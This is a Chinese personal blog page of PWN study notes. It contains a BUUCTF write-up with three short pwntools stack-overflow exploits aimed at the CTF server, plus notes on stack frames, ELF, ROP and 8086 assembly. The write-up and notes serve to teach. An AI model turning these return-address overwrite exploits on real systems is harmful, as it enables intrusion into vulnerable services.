<!DOCTYPE html>


<html lang="zh-CN">
  

    <head>
      <meta charset="utf-8" />
        
      <meta
        name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1"
      />
      <title> =3=</title>
  <meta name="generator" content="hexo-theme-ayer">
      
      <link rel="shortcut icon" href="/favicon.ico" />
       
<link rel="stylesheet" href="/dist/main.css">

      
<link rel="stylesheet" href="/css/fonts/remixicon.css">

      
<link rel="stylesheet" href="/css/custom.css">
 
      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
       
 

      <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
      />
      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>

      <!-- mermaid -->
      
      <style>
        .swal2-styled.swal2-confirm {
          font-size: 1.6rem;
        }
      </style>
    </head>
  </html>
</html>


<body>
  <div id="app">
    
      
    <main class="content on">
      
<section class="cover">
    
  <div class="cover-frame">
    <div class="bg-box">
      <img src="/images/cover1.jpg" alt="image frame" />
    </div>
    <div class="cover-inner text-center text-white">
      <h1><a href="/">=3=</a></h1>
      <div id="subtitle-box">
        
        <span id="subtitle"></span>
        
      </div>
      <div>
        
      </div>
    </div>
  </div>
  <div class="cover-learn-more">
    <a href="javascript:void(0)" class="anchor"><i class="ri-arrow-down-line"></i></a>
  </div>
</section>



<script src="https://cdn.staticfile.org/typed.js/2.0.12/typed.min.js"></script>


<!-- Subtitle -->

  <script>
    try {
      var typed = new Typed("#subtitle", {
        strings: ['最近在搞暑期实践，下周博客一定按时交', '=3=', '^^'],
        startDelay: 0,
        typeSpeed: 200,
        loop: true,
        backSpeed: 100,
        showCursor: true
      });
    } catch (err) {
      console.log(err)
    }
  </script>
  
<div id="main">
  <section class="outer">
  
  
  

<div class="notice" style="margin-top:50px">
    <i class="ri-heart-fill"></i>
    <div class="notice-content" id="broad"></div>
</div>
<script type="text/javascript">
    fetch('https://v1.hitokoto.cn')
        .then(response => response.json())
        .then(data => {
            document.getElementById("broad").innerHTML = data.hitokoto;
        })
        .catch(console.error)
</script>

<style>
    .notice {
        padding: 20px;
        border: 1px dashed #e6e6e6;
        color: #969696;
        position: relative;
        display: inline-block;
        width: 100%;
        background: #fbfbfb50;
        border-radius: 10px;
    }

    .notice i {
        float: left;
        color: #999;
        font-size: 16px;
        padding-right: 10px;
        vertical-align: middle;
        margin-top: -2px;
    }

    .notice-content {
        display: initial;
        vertical-align: middle;
    }
</style>
  
  <article class="articles">
    
    
    
    
    <article
  id="post-BUUCTF-PWN解题（1）"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/07/29/BUUCTF-PWN%E8%A7%A3%E9%A2%98%EF%BC%881%EF%BC%89/"
    >BUUCTF-PWN解题（1）</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/07/29/BUUCTF-PWN%E8%A7%A3%E9%A2%98%EF%BC%881%EF%BC%89/" class="article-date">
  <time datetime="2023-07-29T09:17:59.000Z" itemprop="datePublished">2023-07-29</time>
</a>    
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <p>@[TOC]</p>
<h1 id="RIP"><a href="#RIP" class="headerlink" title="RIP"></a>RIP</h1><ul>
<li>文件检查：</li>
</ul>
<p>64位文件，没有开启保护</p>
<p><img src="https://img-blog.csdnimg.cn/219f70cffb5241b2ba5aa97740aab2c5.png#pic_center"></p>
<ul>
<li>代码分析：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/t-i-a-nnnn/myblog@main/img/202307311255315.png" alt="在这里插入图片描述"></p>
<p>存在gets函数，存在溢出条件，找到后门函数地址即可</p>
<p><img src="https://cdn.jsdelivr.net/gh/t-i-a-nnnn/myblog@main/img/202307311257800.png" alt="img"></p>
<ul>
<li>exp如下：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = remote(&#x27;node4.buuoj.cn&#x27;,27715)</span><br><span class="line"></span><br><span class="line">b = 15+8</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*b + p64(0x401187)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<ul>
<li>得到flag</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/ace52bd8f3914502ab8f8c634b499d9c.png#pic_center" alt="在这里插入图片描述"></p>
<h1 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h1><ul>
<li>先把文件放入虚拟机</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/t-i-a-nnnn/myblog@main/img/202307311255365.png" alt="在这里插入图片描述"></p>
<p>没有开启保护并且为64位文件</p>
<ul>
<li>放入ida中</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/t-i-a-nnnn/myblog@main/img/202307311255358.png" alt="在这里插入图片描述"></p>
<p>代码分析：两个write函数输出，利用sprintf函数将sub_40060函数的地址打印出来放到s，在最后一行发现gets函数，存在溢出条件。查看是否有后门函数，</p>
<p><img src="https://cdn.jsdelivr.net/gh/t-i-a-nnnn/myblog@main/img/202307311255424.png" alt="在这里插入图片描述"></p>
<p>发现了cat flag，只要返回到0x40060D，即可得到flag。</p>
<p><img src="https://cdn.jsdelivr.net/gh/t-i-a-nnnn/myblog@main/img/202307311255440.png" alt="在这里插入图片描述"></p>
<p>偏移量ida已经给出一部分，略加计算可偏移量为0x40+8</p>
<p>exp如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = remote(&#x27;node4.buuoj.cn&#x27;,27766)</span><br><span class="line"></span><br><span class="line">b = 0x40+8</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*b + p64(0x40060D)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive() </span><br></pre></td></tr></table></figure>



<p>得到flag<br><img src="https://cdn.jsdelivr.net/gh/t-i-a-nnnn/myblog@main/img/202307311255467.png" alt="在这里插入图片描述"></p>
<hr>
<h1 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h1><ul>
<li>文件检查：<br><img src="https://img-blog.csdnimg.cn/584ccaa9201e47fe83d5894954e27e85.png#pic_center" alt="在这里插入图片描述"></li>
</ul>
<p>发现是64位文件，且只开启了NX保护</p>
<ul>
<li>代码分析：</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/d0b1abf00a114a00ad894f16870b637a.png#pic_center" alt="在这里插入图片描述"></p>
<p>主函数中调用了func函数，进取看看</p>
<p><img src="https://img-blog.csdnimg.cn/c5bef35b4e9b42aba7bc5133596cee22.png#pic_center" alt="在这里插入图片描述"></p>
<p>第九行发现gets函数，且有system函数，找到cat flag的地址就可以直接栈溢出到返回地址。</p>
<ul>
<li>exp如下：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = remote(&#x27;node4.buuoj.cn&#x27;,29229)</span><br><span class="line"></span><br><span class="line">c = 0x30+8</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27; * c + p64(0x4006BE)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<ul>
<li>得到FLAG</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/t-i-a-nnnn/myblog@main/img/202307311255416.png" alt="在这里插入图片描述"></p>
<hr>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-栈溢出-栈结构"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/07/29/%E6%A0%88%E6%BA%A2%E5%87%BA-%E6%A0%88%E7%BB%93%E6%9E%84/"
    >栈溢出-栈结构</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/07/29/%E6%A0%88%E6%BA%A2%E5%87%BA-%E6%A0%88%E7%BB%93%E6%9E%84/" class="article-date">
  <time datetime="2023-07-29T09:17:43.000Z" itemprop="datePublished">2023-07-29</time>
</a>    
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <p>@[toc]</p>
<h1 id="栈帧结构概览"><a href="#栈帧结构概览" class="headerlink" title="栈帧结构概览"></a>栈帧结构概览</h1><p><img src="https://img-blog.csdnimg.cn/e4075f4a4b394354aa527222148a17fd.jpeg#pic_center" alt="在这里插入图片描述"></p>
<ul>
<li>父函数栈帧的栈底指针的值与子函数栈帧紧邻，以方便恢复父函数栈底指针</li>
</ul>
<ul>
<li>局部变量保存在栈帧的<code>local variabls</code>，这里也是最容易发生栈溢出的位置，这里受用户控制，如果写入的超长，会覆盖到其他的控制信息</li>
<li>子函数所用的参数保存在父函数的<code>arguments</code></li>
<li>在<code>ebp</code>和<code>esp</code>中间是一个栈帧。紧邻高地址就是父函数的栈帧</li>
</ul>
<hr>
<p><img src="https://img-blog.csdnimg.cn/8b587cc935264c5a97afa7dfe4eda133.jpeg#pic_center" alt="在这里插入图片描述"></p>
<ul>
<li>定义<ul>
<li><code>esp</code>用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化</li>
<li><code>ebp</code>用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置</li>
<li><code>eip</code>用来存储即将执行的程序指令的地址<br><strong>将被调用的函数的参数压入栈内是&#x3D;&#x3D;倒序压入&#x3D;&#x3D;</strong></li>
</ul>
</li>
</ul>
<h2 id="发生函数调用时，栈发生的变化"><a href="#发生函数调用时，栈发生的变化" class="headerlink" title="发生函数调用时，栈发生的变化"></a>发生函数调用时，栈发生的变化</h2><pre><code>- 先将被调用函数的参数按照逆序依次压入栈。如果被调用函数不需要参数，则没有这一步骤
- 这些参数会保存在调用函数的函数状态内，之后压入栈内的数据都会作为被调用函数的函数状态来保持
- 在压入所有参数后，会将调用函数进行调用后的下一条指令地址作为返回地址压入栈内，使得调用函数的`eip`信息得以保存
- 再将当前的`ebp`寄存器的值即调用函数的基地址压入栈内，并更新`ebp`寄存器的值为当前栈顶的地址
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/defa480b27ac4827990ac944d03a9b9b.jpeg#pic_center" alt="在这里插入图片描述"></p>
<ul>
<li>再之后将被调用函数的局部变量压入栈内<br> <strong>&#x3D;&#x3D;栈顶永远是当前正在执行的指令所属的函数对应的栈帧&#x3D;&#x3D;</strong></li>
</ul>
<h2 id="程序执行完毕返回的过程"><a href="#程序执行完毕返回的过程" class="headerlink" title="程序执行完毕返回的过程"></a>程序执行完毕返回的过程</h2><pre><code>- 先将被调用函数的局部变量弹出栈外，将esp增大到ebp，相当于esp-ebp中间的空间不再使用
- 将调用函数的ebp弹出栈外，并存到eip寄存器内
- 至此调用函数的函数指令就全部恢复了
</code></pre>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-PWN入门学习（2）"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/07/29/PWN%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%EF%BC%882%EF%BC%89/"
    >PWN入门学习（2）</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/07/29/PWN%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%EF%BC%882%EF%BC%89/" class="article-date">
  <time datetime="2023-07-29T09:17:32.000Z" itemprop="datePublished">2023-07-29</time>
</a>    
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <p>@[toc]</p>
<h1 id="程序的编译与链接"><a href="#程序的编译与链接" class="headerlink" title="程序的编译与链接"></a>程序的编译与链接</h1><p><strong>从C源代码到可执行文件的生成过程</strong></p>
<ul>
<li>编译<br>  由C语言代码生成的汇编代码</li>
<li>汇编<br>  由汇编代码生成机器码</li>
</ul>
<p>-链接<br>        将多个机器码的目标文件链接成一个可执行文件<img src="https://img-blog.csdnimg.cn/b0b8617365a74e1f8d9f51f651199bd2.jpeg#pic_center" alt="图像化执行过程"><br><strong>程序数据是如何在内存中组织的</strong><br><img src="https://img-blog.csdnimg.cn/d980c4a46a7a4e2ca0a47f3fd86d6461.jpeg#pic_center" alt="在这里插入图片描述"></p>
<p>​		</p>
<h1 id="Linux下的可执行文件格式ELF"><a href="#Linux下的可执行文件格式ELF" class="headerlink" title="Linux下的可执行文件格式ELF"></a>Linux下的可执行文件格式ELF</h1><p><strong>什么是可执行文件？</strong></p>
<ul>
<li>广义：文件中的数据是可执行代码的文件</li>
<li><pre><code>  例如：.out .exe .sh .py
</code></pre>
</li>
<li>狭义：文件中的数据是机器码的文件</li>
<li><pre><code> 例如：.out .exe .dll .so
</code></pre>
</li>
</ul>
<p><strong>可执行文件的分类</strong></p>
<table>
<thead>
<tr>
<th></th>
<th>可执行程序</th>
<th>动态链接库</th>
<th>静态链接库</th>
</tr>
</thead>
<tbody><tr>
<td>windows：PE</td>
<td>.exe</td>
<td>.dll</td>
<td>.lib</td>
</tr>
<tr>
<td>Linux：ELF</td>
<td>.out</td>
<td>.so</td>
<td>.a</td>
</tr>
</tbody></table>
<ul>
<li>ELF文件头表</li>
<li><pre><code>  记录了ELF文件的组织结构
</code></pre>
</li>
<li>程序头表&#x2F;段表</li>
<li><pre><code>    告诉系统如何创建进程
</code></pre>
</li>
<li><pre><code>    生成进程的可执行文件必须拥有此结构
</code></pre>
</li>
<li><pre><code>    重定位文件不一定需要
</code></pre>
</li>
<li>节头表</li>
<li><pre><code>    记录ELF文件的节区信息
</code></pre>
</li>
<li><pre><code>    用于链接的目标文件必须拥有此结构
</code></pre>
</li>
<li><pre><code>    其他类型目标文件不一定需要
</code></pre>
</li>
</ul>
<hr>
<ul>
<li>磁盘中的ELF（可执行文件）与内存中的ELF（进程内存映像）<br><img src="https://img-blog.csdnimg.cn/974aee7ba4104e2792d2eeaf3e619f30.jpeg#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/212d83a1aab34294acfe83595e95e269.jpeg#pic_center" alt="在这里插入图片描述"></li>
</ul>
<h1 id="进程虚拟地址空间"><a href="#进程虚拟地址空间" class="headerlink" title="进程虚拟地址空间"></a>进程虚拟地址空间</h1><ul>
<li>ELF文件到虚拟地址空间的映射<br><img src="https://img-blog.csdnimg.cn/f71d4cdb378147939700776b15abbef5.jpeg#pic_center" alt="在这里插入图片描述"></li>
</ul>
<hr>
<ul>
<li>地址以字节编码</li>
<li><pre><code>    1Byte = 8bits
</code></pre>
</li>
<li>常以16进制表示</li>
<li><pre><code>    0x3c = 0011 1100
</code></pre>
</li>
<li><ul>
<li>虚拟内存用户空间每个进程一份</li>
</ul>
</li>
<li><ul>
<li>虚拟内存内核空间所有进程共享一份</li>
</ul>
</li>
<li><ul>
<li>虚拟内存mmap段中的动态链接库仅在物理内存中装载一份</li>
</ul>
</li>
</ul>
<hr>
<p><strong>段与节</strong></p>
<ul>
<li>代码段包含了代码与只读数据：</li>
</ul>
<blockquote>
<p>.text 节<br>.redata 节<br>.hash 节<br>.dynsym 节<br>.plt 节<br>.re;.got 节<br>….</p>
</blockquote>
<ul>
<li>数据段包含了可读可写数据<blockquote>
<p>.data 节<br>.dynamic 节<br>.got 节<br>.got.plt 节<br>.bss 节<br>….</p>
</blockquote>
</li>
<li>栈段<blockquote>
<p>一个段包含多个节<br>段视图用于进程的内存区域的rwx权限划分<br>节视图用于ELF文件编译链接时在与磁盘上存储时的文件结构的组织</p>
</blockquote>
</li>
</ul>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-PWN入门学习（1）"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/07/29/PWN%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%EF%BC%881%EF%BC%89/"
    >PWN入门学习（1）</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/07/29/PWN%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%EF%BC%881%EF%BC%89/" class="article-date">
  <time datetime="2023-07-29T09:17:27.000Z" itemprop="datePublished">2023-07-29</time>
</a>    
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <p>@[toc]</p>
<h1 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h1><ul>
<li>栈是一种典型的后进先出(Last in First Out)的数据结构，其操作主要有压栈(push)与出栈(pop)两种操作，<strong>程序的栈是从进程地址空间的高地址向低地址增长的。</strong><br><img src="https://img-blog.csdnimg.cn/b3536648e210461f8c1bf38eb6020141.jpeg#pic_center" alt="在这里插入图片描述"></li>
</ul>
<h1 id="栈溢出原理"><a href="#栈溢出原理" class="headerlink" title="栈溢出原理"></a>栈溢出原理</h1><p>指程序向栈中某个变量写入的字节超过了这个变量本身所申请的字节数，导致与其相邻的栈中的变量的值被改变，属于缓冲区溢出漏洞的一种，类似的还是堆溢出、bss段溢出等。</p>
<p>栈溢出发生条件：<br>1、程序必须向栈上写入数据<br>2、写入的数据大小没有被良好地控制<br>最典型的栈溢出利用就是覆盖返回地址为攻击者所控制的地址。例：</p>
<ul>
<li>输入函数:gets(无限输入真到遇到回车),scanf,vscanf</li>
<li>输出函数:sprint</li>
<li>字符串操作函数：strcpy(字符复制，遇’<br>′k00′停止)、strcat(字符拼接,遇’“x00′停止)、bcopy</li>
</ul>
<h1 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h1><p>  32位函数参数在函数返回地址的上方（高地址方向），64位函数参数前6个依次在寄存器rdi、rsi、rdx、r8、r9中，第7个以上的压入栈中</p>
<ul>
<li>注：需要注意的是，32位程序在进行多次函数调用时要保持栈平衡;例:callme32、callme64(讲完基础栈溢出就可以做了)</li>
</ul>
<h1 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h1><p> ROP(Return Oriented Programming)是栈溢出攻击的主要方法,其主要思想是在栈溢出的基础上，利用程序中已有的小片段(gadgets)来改变某些寄存器或者变量的值，从而控制程序的执行流程<br>利用条件：<br>1、程序存在栈溢出且可控制返回地址<br>2、可以找到满足条件的gadgets以及gadgets的地址<br>相关的攻击类型有ret2text、ret2shellcode、ret2syscall、ret2libc</p>
<h1 id="re2-dl-runtime-resolve"><a href="#re2-dl-runtime-resolve" class="headerlink" title="re2_dl_runtime_resolve"></a>re2_dl_runtime_resolve</h1><p>原理：要想弄懂这个ROP利用技巧，需要首先理解ELF文件的基本结构以及动态链接的基本过程。<br>具体利用方法如下：<br>1、控制程序执行 dl resolve 函数:给定 Link map 以及 index 两个参数;或者我们可以直接给定plt0对应的汇编代码，这时，我们只需要一个index就足够了。<br>2、控制index的大小，以便于指向自己所控制的区域，从而伪造一个指定的重定位表项。<br>3、伪造重定位表项，使得重定位表项所指的符号也在自己可以控制的范围内4、伪造符号内容，使得符号对应的名称也在自己可以控制的范围内。</p>
<h1 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h1><p>栈迁移：劫持栈指针指向攻击者所能控制的内存处，然后再进行ROP 一般在以下情况下用到：</p>
<ul>
<li>可以控制的栈溢出的字节数较少，很难构造较长的ROP链</li>
<li>其它漏洞难以利用，我们需要进行转换，比如说劫持到堆空间。<br>栈迁移利用条件：<ul>
<li>可以控制程序流、可以控制sp指针,常见的gadgets有:pop rsp&#x2F;esp、leave;ret(leave ret可以相当于mov espebp;pop ebp;ret)</li>
</ul>
</li>
</ul>
<h1 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h1><ul>
<li>CANARY(栈保护)：是栈溢出攻击的缓冲手段(可绕过)</li>
<li>NX：即No-eXecute(不可执行)，开启后数据所在内存页标识为不可执行RELRO(read only relocation),RELRO为Partial RELRO时说明我们对GOT表具有写权限,为Full RELRO时GOT表不可写</li>
<li>PIE(ASLR)：地址空间随机化，开启后堆、栈、共享库地址随机化，程序每一次运行时，三者的地址都会变化，运行过程中不变，由操作系统决定开不开启，所以通常所有程序都有<br>默认情况下NX和PIE会同时工作，linux关闭pie命令如下：<br>sudo sh-c” echo 0&gt;&#x2F; proc&#x2F; sys&#x2F; kernel&#x2F; randomize_va_space”</li>
</ul>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-汇编语言知识点总结"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/07/29/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/"
    >汇编语言知识点总结</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/07/29/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/" class="article-date">
  <time datetime="2023-07-29T09:17:16.000Z" itemprop="datePublished">2023-07-29</time>
</a>    
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <p>@[TOC]</p>
<h1 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h1><h2 id="1-指令"><a href="#1-指令" class="headerlink" title="1.指令"></a>1.指令</h2><p>机器指令：CPU能直接识别并执行的二进制编码</p>
<p>汇编指令：汇编指令是机器指令的助记符，同机器指令一一对应。</p>
<p>指令：指令通常由操作码和地址码（操作数）两部分组成</p>
<p>指令集：每种CPU都有自己的汇编指令集。</p>
<p>汇编语言由3类指令组成。</p>
<ul>
<li>汇编指令（机器码的助记符）</li>
<li>伪指令（由编译器执行）</li>
<li>其他符号 （由编译器执行）<br>汇编语言的核心是汇编指令，它决定了汇编语言的特性</li>
</ul>
<h2 id="2-存储器"><a href="#2-存储器" class="headerlink" title="2.存储器"></a>2.存储器</h2><p>随机存储器（RAM）在程序的执行过程中可读可写，必须带电存储</p>
<p>只读存储器（ROM）在程序的执行过程中只读，关机数据不丢失</p>
<h2 id="3-总线"><a href="#3-总线" class="headerlink" title="3.总线"></a>3.总线</h2><p>（1）逻辑上划分为：</p>
<ul>
<li>地址总线</li>
<li>数据总线</li>
<li>控制总线</li>
</ul>
<p>（2）cpu对存储器的读写：</p>
<ul>
<li>存储单元的地址（地址总线）</li>
<li>器件的选择，读或写命令（控制总线）</li>
<li>读或写的数据（数据信息）</li>
</ul>
<h1 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h1><h2 id="1-寄存器"><a href="#1-寄存器" class="headerlink" title="1.寄存器"></a>1.寄存器</h2><p>CPU由运算器、控制器、寄存器等器件构成，这些器件靠片内总线相连。</p>
<p>运算器进行信息处理；控制器控制各种器件进行工作；寄存器进行信息存储；</p>
<p>8086CPU有14个寄存器：AX、BX、CX、DX、SI、DI、SP、BP、IP、CS、SS、DS、ES、PSW都是16位</p>
<p>16位结构CPU具有下面几方面的结构特性</p>
<ul>
<li>运算器一次最多可以处理16位的数据</li>
<li>寄存器的最大宽度为16位</li>
<li>寄存器和运算器之间的通路为16位</li>
</ul>
<h2 id="2-通用寄存器"><a href="#2-通用寄存器" class="headerlink" title="2.通用寄存器"></a>2.通用寄存器</h2><table>
<thead>
<tr>
<th>16位</th>
<th>高8位</th>
<th>低8位</th>
</tr>
</thead>
<tbody><tr>
<td>AX</td>
<td>AH</td>
<td>AL</td>
</tr>
<tr>
<td>BX</td>
<td>BH</td>
<td>BL</td>
</tr>
<tr>
<td>CX</td>
<td>CH</td>
<td>CL</td>
</tr>
<tr>
<td>DX</td>
<td>DH</td>
<td>DL</td>
</tr>
</tbody></table>
<h2 id="3-物理地址"><a href="#3-物理地址" class="headerlink" title="3.物理地址"></a>3.物理地址</h2><p>CPU访问内存单元时要给出内存单元的地址。所有的内存单元构成的存储空间是一个一维线性空间。我们称这个唯一的地址为物理地址。</p>
<h2 id="4-地址加法器工作原理"><a href="#4-地址加法器工作原理" class="headerlink" title="4.地址加法器工作原理"></a>4.地址加法器工作原理</h2><p>地址加法器合成物理地址的方法：<br>    物理地址&#x3D;段地址*16+偏移地址</p>
<h2 id="5-段寄存器"><a href="#5-段寄存器" class="headerlink" title="5.段寄存器"></a>5.段寄存器</h2><p>段寄存器就是提供段地址的，8086CPU有4个段寄存器：<br>CS、DS、SS、ES<br>当8086CPU要访问内存是，由这4个段寄存器提供内存单元的段地址</p>
<h2 id="6-CS和IP"><a href="#6-CS和IP" class="headerlink" title="6.CS和IP"></a>6.CS和IP</h2><p>CS为代码段寄存器<br>IP为指令指针寄存器</p>
<p>CPU将CS、IP中的内容当作指令的段地址和偏移地址,用它们合成指令的物理地址,</p>
<p>CPU将CS:IP指向的内容当作指令执行</p>
<h1 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h1><h2 id="1-内存中字的存储"><a href="#1-内存中字的存储" class="headerlink" title="1.内存中字的存储"></a>1.内存中字的存储</h2><p>在0地址处开始存放20000（4E20H）<img src="https://img-blog.csdnimg.cn/75acbf8ba26f42ed9674a23013a1ce11.png#pic_center" alt="在这里插入图片描述"><br>高位对应高地址，低位对应低地址存储</p>
<p>任何两个地址连续的内存单元，N号单元和N+1号单元，可以将它们看成两个内存单元，也可以看成一个地址为N的字单元中的高位字节单元和低位字节单元。</p>
<h2 id="2-DS和-address"><a href="#2-DS和-address" class="headerlink" title="2.DS和[address]"></a>2.DS和[address]</h2><p>DS寄存器，通常用来存放要访问的数据的段地址。</p>
<p>执行指令时，8086CPU自动取DS中的数据为内存单元的段地址</p>
<h2 id="3-栈"><a href="#3-栈" class="headerlink" title="3.栈"></a>3.栈</h2><p>栈是一种具有特殊的访问方式的存储空间。它的特殊性就在于，最后进入这个空间的数据，最先出去</p>
<p>栈的两个基本操作：入栈和出栈</p>
<ul>
<li>入栈：将一个新的元素放到栈顶</li>
<li>出栈：从栈顶取出一个元素<br>所以栈顶的元素总是最后入栈，需要出栈时，又最先被从栈中取出</li>
</ul>
<p>&#x3D;&#x3D;执行push时SP需-2<br>执行pop时SP需+2&#x3D;&#x3D;</p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-汇编语言学习日志"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/07/29/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97/"
    >汇编语言学习日志</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/07/29/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97/" class="article-date">
  <time datetime="2023-07-29T09:17:09.000Z" itemprop="datePublished">2023-07-29</time>
</a>    
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <p>第四章-实验三（编程、编译、连接、跟踪）</p>
<h1 id="（1）-根据题示完成tl-asm文件，并生成可执行文件tl-exe"><a href="#（1）-根据题示完成tl-asm文件，并生成可执行文件tl-exe" class="headerlink" title="（1） 根据题示完成tl.asm文件，并生成可执行文件tl.exe"></a>（1） 根据题示完成tl.asm文件，并生成可执行文件tl.exe</h1><p><img src="https://img-blog.csdnimg.cn/89a078530f354a1b9513ba532e686e1a.png#pic_center" alt="在这里插入图片描述"></p>
